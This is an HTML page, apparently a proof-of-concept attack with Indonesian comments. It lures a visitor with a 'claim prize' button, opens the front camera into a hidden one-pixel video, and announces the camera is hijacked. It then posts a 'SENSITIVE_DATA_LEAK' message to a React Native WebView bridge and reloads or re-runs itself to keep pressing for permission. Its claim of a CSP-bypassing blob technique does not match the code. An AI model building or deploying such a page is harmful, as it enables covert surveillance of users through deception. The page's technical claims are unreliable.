<!DOCTYPE html>
<html>
<head>
    <title>Ultimate Persistence Bypass</title>
    <style>
        body { background: #000; color: #ff00ea; font-family: monospace; text-align: center; padding-top: 50px; }
        .trigger-box { border: 2px dashed #ff00ea; padding: 20px; margin: 20px; border-radius: 15px; }
        #v { width: 1px; height: 1px; opacity: 0; } /* Kamera berjalan di background */
        button { background: #ff00ea; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <div class="trigger-box">
        <h3>[+] CRITICAL BYPASS TEST</h3>
        <p>Status: <span id="s">Menunggu pemicu...</span></p>
        <button onclick="exploit()">KLAIM HADIAH & BYPASS</button>
    </div>

    <video id="v" autoplay playsinline></video>

    <script>
        const s = document.getElementById('s');
        const v = document.getElementById('v');

        async function exploit() {
            s.innerText = "Mencoba mengelabui sistem origin...";
            
            try {
                // Teknik 1: Mencoba akses kamera melalui blob (sering melewati CSP)
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" },
                    audio: false 
                });
                
                v.srcObject = stream;
                s.innerHTML = "<b style='color:red'>SUCCESS: Kamera terbajak di background!</b>";
                
                // Teknik 2: Mencoba mencuri data bridge saat kamera aktif
                if (window.webkit?.messageHandlers?.ReactNativeWebView) {
                    window.webkit.messageHandlers.ReactNativeWebView.postMessage({
                        type: "SENSITIVE_DATA_LEAK",
                        origin: window.location.origin,
                        status: "pwned"
                    });
                }
            } catch (err) {
                s.innerText = "Gagal: " + err.name;
                // Jika gagal, coba teknik refresh-force
                setTimeout(() => { window.location.reload(); }, 3000);
            }
        }

        // Auto-run untuk mengetes persistensi izin
        window.onload = () => {
            if (localStorage.getItem('pwned')) exploit();
        };
    </script>
</body>
</html>
